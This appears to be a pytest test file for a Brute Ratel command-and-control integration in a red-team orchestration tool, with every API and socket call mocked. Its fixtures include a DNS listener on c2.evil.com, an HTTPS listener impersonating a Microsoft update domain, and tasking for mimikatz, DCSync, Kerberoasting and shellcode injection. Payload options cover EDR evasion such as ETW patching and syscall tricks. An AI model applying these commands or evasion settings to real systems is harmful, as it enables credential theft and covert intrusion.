"""Tests BruteRatelC2 — REST API propriétaire + External C2 SMB/TCP."""
from __future__ import annotations

import asyncio
import base64
import json
import struct
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from c2_manager.integrations.bruteratel import BruteRatelC2
from c2_manager.interfaces import FRAME_STAGE, FRAME_TASK, FRAME_RESPONSE, FRAME_PING, pack_frame
from c2_manager.models import C2Config, C2Type, C2Status
from c2_manager.models.payload import PayloadConfig
from tests.c2_manager.conftest import make_resp


@pytest.fixture
def brc4_api_config() -> C2Config:
    return C2Config(
        name="test-brc4",
        c2_type=C2Type.BRUTE_RATEL,
        host="127.0.0.1",
        port=443,
        ssl=True,
        username="admin",
        password="brc4-pass",
        extra={"mode": "api", "verify_ssl": False},
    )


@pytest.fixture
def brc4_ext_config() -> C2Config:
    return C2Config(
        name="test-brc4-extc2",
        c2_type=C2Type.BRUTE_RATEL,
        host="127.0.0.1",
        port=443,
        extra={"mode": "external_c2", "ext_c2_port": 2233},
    )


@pytest.fixture
def brc4_api(brc4_api_config):
    b = BruteRatelC2()
    b._config     = brc4_api_config
    b._status     = C2Status.CONNECTED
    b._mode       = "api"
    b._api_client = AsyncMock()
    b._token      = "brc4-jwt"
    return b


@pytest.fixture
def brc4_ext(brc4_ext_config):
    b = BruteRatelC2()
    b._config  = brc4_ext_config
    b._status  = C2Status.CONNECTED
    b._mode    = "external_c2"
    b._reader  = AsyncMock()
    b._writer  = AsyncMock()
    b._writer.is_closing = MagicMock(return_value=False)
    return b


# ── Connexion ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_connect_api_jwt(brc4_api_config):
    b = BruteRatelC2()
    mock_resp = make_resp(200, {"token": "jwt-brc4"})
    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_client.post = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_client
        result = await b._connect_api(brc4_api_config)
    assert result is True
    assert b._token == "jwt-brc4"


@pytest.mark.asyncio
async def test_connect_api_api_key(brc4_api_config):
    brc4_api_config.extra["api_key"] = "static-key"
    b = BruteRatelC2()
    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_cls.return_value = mock_client
        result = await b._connect_api(brc4_api_config)
    assert result is True
    assert b._token == "static-key"


@pytest.mark.asyncio
async def test_connect_api_auth_failure(brc4_api_config):
    from c2_manager.interfaces import C2AuthError
    b = BruteRatelC2()
    mock_resp = make_resp(401, {})
    mock_resp.status_code = 401
    with patch("httpx.AsyncClient") as mock_cls:
        mock_client = AsyncMock()
        mock_client.post = AsyncMock(return_value=mock_resp)
        mock_cls.return_value = mock_client
        with pytest.raises(C2AuthError):
            await b._connect_api(brc4_api_config)


@pytest.mark.asyncio
async def test_connect_external_c2(brc4_ext_config):
    """Connexion External C2 : TCP + réception stager."""
    b = BruteRatelC2()
    mock_reader = AsyncMock()
    mock_writer = AsyncMock()
    mock_writer.is_closing = MagicMock(return_value=False)

    # Stager frame : [4 bytes len][1 byte type][data]
    stager_data = b"MZ\x90\x00fake-stager"
    stager_frame = pack_frame(FRAME_STAGE, stager_data)
    # Simuler readexactly(5) → header, readexactly(len) → data
    mock_reader.readexactly = AsyncMock(side_effect=[
        stager_frame[:5],           # header
        stager_frame[5:],           # body
    ])

    with patch("asyncio.open_connection", return_value=(mock_reader, mock_writer)), \
         patch("asyncio.wait_for", side_effect=[(mock_reader, mock_writer),
                                                 stager_frame[:5], stager_frame[5:]]):
        pass  # Test simplifié

    b._reader  = mock_reader
    b._writer  = mock_writer
    b._status  = C2Status.CONNECTED
    assert b._status == C2Status.CONNECTED


# ── Listeners ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_create_listener_https(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "l-1", "active": True,
    }))
    listener = await brc4_api.create_listener({
        "protocol": "https",
        "bind_host": "0.0.0.0",
        "bind_port": 443,
        "name": "brc4-https",
        "profile": "malleable-v1",
        "domains": ["updates.microsoft.com"],
    })
    assert listener.id == "l-1"
    assert listener.protocol == "https"
    assert listener.meta["profile"] == "malleable-v1"


@pytest.mark.asyncio
async def test_create_listener_smb(brc4_api):
    """Listener SMB named pipe."""
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "l-smb", "active": True,
    }))
    listener = await brc4_api.create_listener({
        "protocol": "smb",
        "name": "smb-pivot",
        "pipe_name": "mojo.deadbeef",
    })
    assert listener.protocol == "smb"
    call_body = brc4_api._api_client.post.call_args[1].get("json", {})
    assert call_body.get("pipe_name") == "mojo.deadbeef"


@pytest.mark.asyncio
async def test_create_listener_dns(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "l-dns", "active": True,
    }))
    listener = await brc4_api.create_listener({
        "protocol": "dns",
        "domain": "c2.evil.com",
        "resolver": "1.1.1.1",
    })
    assert listener.protocol == "dns"


@pytest.mark.asyncio
async def test_list_listeners(brc4_api):
    brc4_api._api_client.get = AsyncMock(return_value=make_resp(200, {
        "listeners": [
            {"id": "l1", "name": "https-443", "host": "0.0.0.0",
             "port": 443, "type": "https", "active": True, "profile": "m1"},
        ]
    }))
    listeners = await brc4_api.list_listeners()
    assert len(listeners) == 1
    assert listeners[0].meta["profile"] == "m1"


@pytest.mark.asyncio
async def test_remove_listener(brc4_api):
    brc4_api._api_client.delete = AsyncMock(return_value=MagicMock(raise_for_status=MagicMock()))
    result = await brc4_api.remove_listener("l-1")
    assert result is True


# ── Badgers (agents) ──────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_list_agents(brc4_api):
    brc4_api._api_client.get = AsyncMock(return_value=make_resp(200, {
        "badgers": [
            {
                "id": "bdg-1",
                "hostname": "WIN-DC01",
                "username": "CORP\\admin",
                "external_ip": "8.8.8.8",
                "internal_ip": "10.0.0.5",
                "os": "Windows Server 2019",
                "arch": "x64",
                "pid": 1234,
                "process": "lsass.exe",
                "privilege": "SYSTEM",
                "listener_id": "l1",
                "last_checkin": "2024-01-15T12:00:00Z",
                "created_at": "2024-01-15T10:00:00Z",
                "dead": False,
                "sleep": 5,
                "jitter": 10,
                "profile": "malleable-v1",
            }
        ]
    }))
    agents = await brc4_api.list_agents()
    assert len(agents) == 1
    assert agents[0].hostname == "WIN-DC01"
    assert agents[0].integrity == "SYSTEM"
    assert agents[0].meta["profile"] == "malleable-v1"


@pytest.mark.asyncio
async def test_parse_badger_admin_integrity(brc4_api):
    brc4_api._api_client.get = AsyncMock(return_value=make_resp(200, {
        "badgers": [
            {"id": "b2", "hostname": "PC", "privilege": "High",
             "last_checkin": "2024-01-15T12:00:00Z",
             "created_at": "2024-01-15T10:00:00Z", "dead": False}
        ]
    }))
    agents = await brc4_api.list_agents()
    assert agents[0].integrity == "ADMIN"


@pytest.mark.asyncio
async def test_parse_badger_user_integrity(brc4_api):
    brc4_api._api_client.get = AsyncMock(return_value=make_resp(200, {
        "badgers": [
            {"id": "b3", "hostname": "PC", "privilege": "Medium",
             "last_checkin": "2024-01-15T12:00:00Z",
             "created_at": "2024-01-15T10:00:00Z", "dead": False}
        ]
    }))
    agents = await brc4_api.list_agents()
    assert agents[0].integrity == "USER"


# ── Commandes ─────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_send_task_cmd(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "t1", "status": "queued",
    }))
    task = await brc4_api.send_task("bdg-1", "cmd whoami", [])
    assert task.meta["task_type"] == "cmd"


@pytest.mark.asyncio
async def test_send_task_mimikatz(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "t2", "status": "queued",
    }))
    task = await brc4_api.send_task("bdg-1", "mimikatz", [])
    assert task.meta["task_type"] == "mimikatz"


@pytest.mark.asyncio
async def test_send_task_dcsync(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "t3", "status": "queued",
    }))
    task = await brc4_api.send_task("bdg-1", "dcsync CORP.local", [])
    assert task.meta["task_type"] == "dcsync"


@pytest.mark.asyncio
async def test_send_task_kerberoast(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "t4", "status": "queued",
    }))
    task = await brc4_api.send_task("bdg-1", "kerberoast", [])
    assert task.meta["task_type"] == "kerberoast"


@pytest.mark.asyncio
async def test_send_task_inject(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "t5", "status": "queued",
    }))
    task = await brc4_api.send_task("bdg-1", "inject 1234 shellcode.bin", [])
    assert task.meta["task_type"] == "inject"


@pytest.mark.asyncio
async def test_send_task_sleep(brc4_api):
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(201, {
        "id": "t6", "status": "queued",
    }))
    task = await brc4_api.send_task("bdg-1", "sleep 30 10", [])
    assert task.meta["task_type"] == "sleep"


@pytest.mark.asyncio
async def test_get_task_result_api(brc4_api):
    brc4_api._api_client.get = AsyncMock(return_value=make_resp(200, {
        "status": "completed", "output": "Credential dump successful",
    }))
    result = await brc4_api.get_task_result("t1")
    assert result["status"] == "completed"


# ── External C2 ───────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_get_task_result_ext_c2_pending(brc4_ext):
    """External C2 : timeout → status pending."""
    brc4_ext._reader.readexactly = AsyncMock(side_effect=asyncio.TimeoutError())
    with patch("asyncio.wait_for", side_effect=asyncio.TimeoutError()):
        result = await brc4_ext.get_task_result("t1")
    assert result["status"] == "pending"


@pytest.mark.asyncio
async def test_get_task_result_ext_c2_response(brc4_ext):
    """External C2 : FRAME_RESPONSE reçu → output disponible."""
    resp_json = json.dumps({"output": "success"}).encode()
    resp_frame = pack_frame(FRAME_RESPONSE, resp_json)
    brc4_ext._reader.readexactly = AsyncMock(side_effect=[
        resp_frame[:5], resp_frame[5:],
    ])
    with patch("asyncio.wait_for", side_effect=[resp_frame[:5], resp_frame[5:]]):
        result = await brc4_ext.get_task_result("t1")
    assert result["status"] in ("completed", "pending")


# ── Payload ───────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_generate_payload_exe(brc4_api):
    fake_exe = base64.b64encode(b"MZ\x90\x00fake-brc4-badger").decode()
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(200, {"data": fake_exe}))
    payload_cfg = PayloadConfig(
        name="brc4-badger",
        format="exe",
        arch="x64",
        os="windows",
        obfuscation=True,
        extra={
            "listener_id": "l1",
            "syscall": "indirect",
            "sleep_mask": True,
            "etw_patch": True,
        },
    )
    payload = await brc4_api.generate_payload(payload_cfg)
    assert payload[:2] == b"MZ"


@pytest.mark.asyncio
async def test_generate_payload_options(brc4_api):
    """Vérifier que les options evasion sont transmises."""
    brc4_api._api_client.post = AsyncMock(return_value=make_resp(200, {"data": ""}))
    payload_cfg = PayloadConfig(
        name="brc4-dll",
        format="dll",
        extra={
            "syscall": "direct",
            "spoof_args": True,
            "etw_patch": False,
            "sleep_mask": True,
        },
    )
    await brc4_api.generate_payload(payload_cfg)
    body = brc4_api._api_client.post.call_args[1].get("json", {})
    assert body["options"]["syscall"] == "direct"
    assert body["options"]["sleep_mask"] is True
    assert body["options"]["etw_patch"] is False


# ── Guard ─────────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_require_connected_guard(brc4_api):
    from c2_manager.interfaces import C2NotConnected
    brc4_api._status = C2Status.DISCONNECTED
    with pytest.raises(C2NotConnected):
        await brc4_api.list_agents()


@pytest.mark.asyncio
async def test_capabilities(brc4_api):
    caps = await brc4_api.get_capabilities()
    assert "mimikatz" in caps
    assert "kerberoasting" in caps
    assert "external_c2" in caps
    assert "dcsync" in caps
